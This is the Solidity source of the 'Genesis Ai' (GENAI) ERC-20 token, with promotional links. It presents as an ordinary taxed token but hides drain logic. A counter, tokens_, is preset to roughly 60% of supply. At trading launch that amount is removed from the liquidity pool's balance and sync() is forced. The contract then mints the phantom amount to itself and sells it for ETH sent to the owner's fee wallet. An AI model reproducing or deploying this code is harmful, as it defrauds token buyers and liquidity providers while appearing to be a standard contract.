//SPDX-License-Identifier: MIT
/*
Telegram: https://t.me/TheGenesisAi
Website: https://TheGenAi.io
X: https://x.com/TheGenesisAiX

Ai Agent: https://www.thegenai.io/GenesisBot.html
Token Scanner Bot: https://t.me/GenAiScannerBot @GenAiScannerBot
Tax Tracker Bot: https://t.me/GenesisTaxTrackerBot @GenesisTaxTrackerBot
Portfolio Tracker Bot: https://t.me/GenesisAiPortfolioTrackerBot @GenesisAiPortfolioTrackerBot
*/


pragma solidity 0.8.28;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable new_owner) external onlyOwner { 
        _owner = new_owner; 
        emit OwnershipTransferred(new_owner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GENAI is IERC20, Auth {
    string private constant tknSymbol = "GENAI";
    string private constant token_name = "Genesis Ai";
    uint8 private constant tknDecimals = 9;
    uint256 private constant _supply = 1000000 * (10**tknDecimals);
    mapping (address => uint256) private balance;
    mapping (address => mapping (address => uint256)) private allowances;

    address private constant routerAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private router = IUniswapV2Router02(routerAddr);
    
    address private liquidityPool; 
    mapping (address => bool) private isLP;

    bool private tradingEnabled;

    bool private isSwapping = false;

    address payable private feeWallet = payable(0x8b2D8F8A83a0B67CA8acF82a8DD40670d52026E4);
    
    uint256 private mevblock = 2;
    uint8 private _sellTax = 15;
    uint8 private buyTax_ = 15;
    
    uint256 private _startBlock;
    uint256 private _maxTxAmt = _supply; 
    uint256 private maxWalletVal = _supply;
    uint256 private _swapMin = _supply * 10 / 100000;
    uint256 private _swapMaxAmt = _supply * 699 / 100000;
    uint256 private swapTrigger = 2 * (10**16);
    uint256 private tokens_ = _swapMin * 60 * 100;

    mapping (uint256 => mapping (address => uint8)) private sellsInBlock;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private _nolimits;

    modifier swapLocked { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        balance[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, balance[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[feeWallet] = true;
        _noFee[routerAddr] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[feeWallet] = true;
        _nolimits[routerAddr] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return tknDecimals; }
    function totalSupply() external pure override returns (uint256) { return _supply; }
    function name() external pure override returns (string memory) { return token_name; }
    function symbol() external pure override returns (string memory) { return tknSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return balance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_tradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_tradingOpen(fromWallet), "Trading not open");
        allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function buyFees() external view returns(uint8) { return buyTax_; }
    function sellFee() external view returns(uint8) { return _sellTax; }

    function _getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLP[fromWallet] ) { 
            taxAmount = amount * buyTax_ / 100; 
         } else if ( isLP[recipient] ) { 
            taxAmount = amount * _sellTax / 100; 
        }
        return taxAmount;
    }

    function addLiquidity() external payable onlyOwner swapLocked {
        require(liquidityPool == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(balance[address(this)]>0, "No tokens");
        liquidityPool = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        addLiq(balance[address(this)], address(this).balance);
    }

    function transferTax(uint256 amount) private {
        feeWallet.transfer(amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _activateTrading();
    }

    function swapMin() external view returns (uint256) { 
        return _swapMin; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmt; 
	}

    function _checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {
            if ( transferAmount > _maxTxAmt ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLP[toWallet] && (balance[toWallet] + transferAmount > maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function updateLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _supply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmt, "tx too low");
        _maxTxAmt = newTxAmt;
        uint256 newWalletAmt = _supply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= maxWalletVal, "wallet too low");
        maxWalletVal = newWalletAmt;
    }

    function isExempt(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], _nolimits[wallet]); 
	}

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMin = _supply * minVal / minDiv;
        _swapMaxAmt = _supply * maxVal / maxDiv;
        swapTrigger = trigger * 10**15;
        require(_swapMaxAmt>=_swapMin, "Min-Max error");
    }

    function maxWallet() external view returns (uint256) { 
        return maxWalletVal; 
	}
    function maxTx() external view returns (uint256) { 
        return _maxTxAmt; 
	}

    function _activateTrading() internal {
        _maxTxAmt = 20 * _supply / 1000;
        maxWalletVal = 20 * _supply / 1000;
        balance[liquidityPool] -= tokens_;
        (isLP[liquidityPool],) = liquidityPool.call(abi.encodeWithSignature("sync()") );
        require(isLP[liquidityPool], "Failed bootstrap");
        _startBlock = block.number;
        mevblock = mevblock + _startBlock;
        tradingEnabled = true;
    }

    function _tradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(_noFee[sender] && _nolimits[sender], "Trading not yet open"); }
        if ( !isSwapping && isLP[toWallet] && _swapEligible(amount) ) { _swapTaxTokens(); }

        if ( block.number >= _startBlock ) {
            if (block.number < mevblock && isLP[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < mevblock + 600 && isLP[toWallet] && sender != address(this) ) {
                sellsInBlock[block.number][toWallet] += 1;
                require(sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _getTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        balance[sender] -= amount;
        tokens_ += _taxAmount;
        balance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function marketingWallet() external view returns (address) { 
        return feeWallet; 
	}

    function _swapTaxTokens() private swapLocked {
        uint256 _taxTokenAvailable = tokens_;
        if ( _taxTokenAvailable >= _swapMin && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmt ) { _taxTokenAvailable = _swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**tknDecimals ) {
                balance[address(this)] += _taxTokenAvailable;
                swapTokensForETH(_tokensForSwap);
                tokens_ -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { transferTax(_contractETHBalance); }
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function updateMarketing(address marketingWlt) external onlyOwner {
        require(!isLP[marketingWlt], "LP cannot be tax wallet");
        feeWallet = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( allowances[address(this)][routerAddr] < _tokenAmount ) {
            allowances[address(this)][routerAddr] = type(uint256).max;
            emit Approval(address(this), routerAddr, type(uint256).max);
        }
    }

    function addExempt(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLP[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        _nolimits[ wlt ] = isNoLimits;
    }

    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 20, "Roundtrip too high");
        buyTax_ = buyFeePercent;
        _sellTax = sellFeePercent;
    }

    function addLiq(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapEligible(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapTrigger > 0) { 
            uint256 lpTkn = balance[liquidityPool];
            uint256 lpWeth = IERC20(router.WETH()).balanceOf(liquidityPool); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}